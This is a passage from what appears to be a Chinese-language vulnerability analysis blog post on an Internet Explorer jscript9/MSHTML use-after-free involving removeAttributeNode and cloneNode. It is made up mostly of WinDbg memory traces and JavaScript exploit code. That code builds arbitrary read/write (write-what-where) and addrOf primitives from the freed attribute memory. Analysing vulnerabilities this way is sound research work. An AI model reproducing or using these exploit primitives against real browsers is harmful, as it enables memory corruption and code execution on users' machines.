+0541f590  80000901 002dc6c1 09649b84 00000020
+0541f5a0  80000d09 002dc6c1 053872c0 05cec824
+0541f5b0  80000801 002dc6c2 0943b5b4 00000020
+0:009&amp;gt; dd 0943b5b4-4		//attr所在内存也未被清除
+0943b5b0  0002000a 00300030 00300030 00300030
+0943b5c0  00300030 00300030 00300030 00300030
+0943b5d0  00300030 00300030 00300030 00300030
+0943b5e0  00300030 00300030 00300030 00300030
+0943b5f0  00300030 00300030 00300030 00300030
+0943b600  00300030 00300030 00300030 00300030
+0943b610  00300030 00300030 00300030 00300030
+0943b620  00300030 00300030 00300030 00300030
+0:009&amp;gt; p
+eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=10000001 edi=00000001
+eip=73869e6e esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
+73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec314=05cec2ec
+0:009&amp;gt; dd 0541f580 L4*4		//执行完毕后，CAttr中的元素被清除
+0541f580  80000d04 8001141f 05384bc0 05cec4dc
+0541f590  80000801 002dc6c2 0943b5b4 00000020
+0541f5a0  80000801 002dc6c2 0943b5b4 00000020
+0541f5b0  80000801 002dc6c2 0943b5b4 00000020
+0:009&amp;gt; dd 0943b5b4-4		//attr所在内存也被清理，为空闲状态
+0943b5b0  09461fd8 093ff588 00300030 00300030
+0943b5c0  00300030 00300030 00300030 00300030
+0943b5d0  00300030 00300030 00300030 00300030
+0943b5e0  00300030 00300030 00300030 00300030
+0943b5f0  00300030 00300030 00300030 00300030
+0943b600  00300030 00300030 00300030 00300030
+0943b610  00300030 00300030 00300030 00300030
+0943b620  00300030 00300030 00300030 00300030
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e413ed6 ebx=00ebd201 ecx=7209f6b0 edx=00400040 esi=02000001 edi=00000001
+eip=73869e6b esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec328={MSHTML!CFastDOM::CNode::Trampoline_cloneNode (7209f6b0)}	//hd2 = hd1.cloneNode()
+0:009&amp;gt; p
+eax=0c565000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000001 edi=00000001
+eip=73869e6e esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
+73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec314=05cec2ec
+0:009&amp;gt; dd 0943b5b4-4		//attr所占用的内存空间变成了hd1.nodeValue
+0943b5b0  0002000a 00000000 00000000 00000000
+0943b5c0  00000000 00000000 00000000 00000000
+0943b5d0  00000000 00000000 00000000 00000000
+0943b5e0  00000000 00000000 00000000 00000000
+0943b5f0  00000000 00000000 00000000 00000000
+0943b600  00000000 00000000 00000000 00000000
+0943b610  00000000 00000000 00000000 00000000
+0943b620  00000000 00000000 00000000 00000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;然而如果直接返回到removeAttributeNode，当获取Index时就会发生报错，为了避免这种情况添加了attribute到ele中，这样就能成功获取到序号，执行CAttrArray::Destroy将attr所占用的内存空间释放：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e30d7e0 ebx=00ebd201 ecx=7186bf00 edx=00000001 esi=10000003 edi=00000003
+eip=73869e6b esp=05cec2d0 ebp=05cec338 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec320={MSHTML!CFastDOM::CElement::Trampoline_setAttribute (7186bf00)}	//ele.setAttribute(&apos;attribute&apos;, 1337)
+0:009&amp;gt; dd 0541f580 L4*4
+0541f580  80000d04 8001141f 05384bc0 05cec4dc
+0541f590  80000801 002dc6c2 0943b5b4 00000020
+0541f5a0  80000801 002dc6c2 0943b5b4 00000020
+0541f5b0  80000801 002dc6c2 0943b5b4 00000020
+0:009&amp;gt; dd 0943b5b4-4
+0943b5b0  0002000a 00000000 00000000 00000000
+0943b5c0  00000000 00000000 00000000 00000000
+0943b5d0  00000000 00000000 00000000 00000000
+0943b5e0  00000000 00000000 00000000 00000000
+0943b5f0  00000000 00000000 00000000 00000000
+0943b600  00000000 00000000 00000000 00000000
+0943b610  00000000 00000000 00000000 00000000
+0943b620  00000000 00000000 00000000 00000000
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
+eip=73869e6b esp=05cec8d0 ebp=05cec934 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec91c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}
+0:009&amp;gt; dd 0541f580 L4*4		//执行完毕整个removeAttributeNode函数后，ele内有两个元素，attr所占内存也被再次释放
+0541f580  80000d04 8001141f 05384bc0 05cec4dc
+0541f590  80000801 002dc6c1 0945bcbc 08d069d0
+0541f5a0  80000801 002dc6c2 0943b5b4 00000020
+0541f5b0  80000801 002dc6c2 0943b5b4 00000020
+0:009&amp;gt; dd 0943b5b4-4		//hd2.nodeValue
+0943b5b0  09461fd8 093ff588 00000000 00000000
+0943b5c0  00000000 00000000 00000000 00000000
+0943b5d0  00000000 00000000 00000000 00000000
+0943b5e0  00000000 00000000 00000000 00000000
+0943b5f0  00000000 00000000 00000000 00000000
+0943b600  00000000 00000000 00000000 00000000
+0943b610  00000000 00000000 00000000 00000000
+0943b620  00000000 00000000 00000000 00000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;读写原语hd2.nodeValue构造完毕，接下来通过hd2.nodeValue构造write-what-where读写原语来实现利用。&lt;/p&gt;
+
+&lt;h2 id=&quot;构造write-what-where&quot;&gt;构造write-what-where&lt;/h2&gt;
+
+&lt;p&gt;构造write-what-where读写原语EXP：&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;DataView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setUint16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;setData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;hd1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nodeValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alloc1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nodeValue&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;hd2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nodeValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;hd2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hd1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cloneNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;god&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getUint8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;god&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getUint16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;god&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getUint32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;god&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setUint8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;god&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setUint16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;god&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setUint32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;writeData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hd2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nodeValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pAbf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;//fake&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pArr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;//arr&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VT_I4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VT_DISPATCH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VT_BYREF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;
